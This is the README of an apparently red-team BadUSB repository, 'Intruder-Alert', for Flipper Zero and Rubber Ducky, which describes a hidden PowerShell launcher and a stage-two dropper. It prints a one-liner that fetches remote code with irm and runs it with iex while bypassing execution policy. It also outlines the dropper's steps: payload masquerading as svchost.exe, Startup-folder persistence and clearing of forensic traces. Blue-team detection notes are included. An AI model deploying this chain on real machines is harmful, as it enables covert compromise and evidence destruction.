# Intruder-Alert — BadUSB Adversary Simulation Payloads

> **⚠️ LEGAL DISCLAIMER:** These payloads are strictly for authorized security research, penetration testing, and SOC lab environments. Use only on systems you own or have explicit written permission to test. Unauthorized use is illegal and unethical. The author assumes no liability for misuse.

---

## Overview

This repository contains BadUSB payloads designed for the **Flipper Zero** and **USB Rubber Ducky**, intended for adversary simulation and SOC detection engineering. Each payload represents a real-world attack technique that blue teams can use to build, tune, and validate detections.

**Author:** spac3gh0st  
**Target Platform:** Windows 10 / 11  
**Use Case:** SOC Lab — Detection & Incident Response Training

---

## Repository Structure

```
.
├── flipper-bad.txt         # Ducky Script — HID payload launcher
├── flipper-badv2.ps1       # PowerShell stage-two dropper
└── README.md               # This file
```

---

## Payload Details

### `flipper-bad.txt` — HID Launcher (Ducky Script)

| Property | Value |
|---|---|
| Interface | Flipper Zero / Rubber Ducky |
| Technique | T1204.002 — User Execution: Malicious File |
| Action | Opens a hidden PowerShell window and fetches the stage-two script |

**How it works:**  
Simulates a physical HID (keyboard) attack by opening the Windows Run dialog and executing a one-liner that pulls a remote PowerShell script via `Invoke-Expression`. The window is hidden (`-w h`) and execution policy is bypassed (`-Ep Bypass`).

**Setup:**  
Replace the placeholder URL in the `STRING` command with the hosted URL of your stage-two script:
```
STRING powershell -w h -NoP -Ep Bypass $dc='<YOUR-PAYLOAD-URL>';irm <YOUR-SCRIPT-URL> | iex
```

---

### `flipper-badv2.ps1` — Stage-Two Dropper (PowerShell)

| Property | Value |
|---|---|
| Language | PowerShell 5.1+ |
| Technique | T1105 — Ingress Tool Transfer |
| Technique | T1547.001 — Boot/Logon Autostart: Registry Run Keys / Startup Folder |
| Technique | T1070.004 — Indicator Removal: File Deletion |
| Action | Downloads, executes, and persists a payload; clears forensic artifacts |

**Execution Flow:**

```
[HID Trigger]
     │
     ▼
[1] Create drop directory   →  C:\Windows\Temp\Cache\
     │
     ▼
[2] Download payload        →  saved as svchost.exe  (process name masquerading)
     │
     ▼
[3] Execute payload         →  Start-Process
     │
     ▼
[4] Establish persistence   →  Startup folder shortcut (.lnk)
     │
     ▼
[5] Clear forensic trail    →  Run MRU, PS history, Recycle Bin
```

---

## MITRE ATT&CK Coverage

| ID | Technique | Description |
|---|---|---|
| T1200 | Hardware Additions | Physical HID device attack |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Stage-one launcher |
| T1105 | Ingress Tool Transfer | Remote payload download |
| T1036.005 | Masquerading: Match Legitimate Name | Payload named `svchost.exe` |
| T1547.001 | Boot Autostart: Startup Folder | Persistence via `.lnk` shortcut |
| T1070.004 | Indicator Removal: File Deletion | PS history, Run MRU, Recycle Bin cleared |

---

## Detection Opportunities (Blue Team Notes)

Use these payloads to build and validate detections for the following signals:

- **Suspicious `powershell.exe` spawn** from `explorer.exe` with `-w h` and `-Ep Bypass` flags
- **`Invoke-WebRequest` / `irm` + `iex`** chained in a single command (fileless execution pattern)
- **File write to `C:\Windows\Temp\`** with an executable named after a known system process
- **`.lnk` file creation** in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`
- **Registry key deletion** of `RunMRU` via `reg.exe` spawned from PowerShell
- **`Remove-Item` on `PSReadLine` history path** (`ConsoleHost_history.txt`)

---

## Lab Setup Requirements

- Flipper Zero with BadUSB app, or USB Rubber Ducky
- A Windows 10/11 VM (snapshot recommended — restore after each test)
- A file hosting endpoint for your payload (e.g., local HTTP server, Dropbox, GitHub raw)
- A SIEM or EDR for detection validation (e.g., Splunk, Elastic, Microsoft Defender for Endpoint)

---

## Credits

Inspired by techniques from **i-am-Jakoby**, **Luther**, and the broader BadUSB/offensive PowerShell community.

---

## License

For educational and authorized testing use only. See `DISCLAIMER` above.
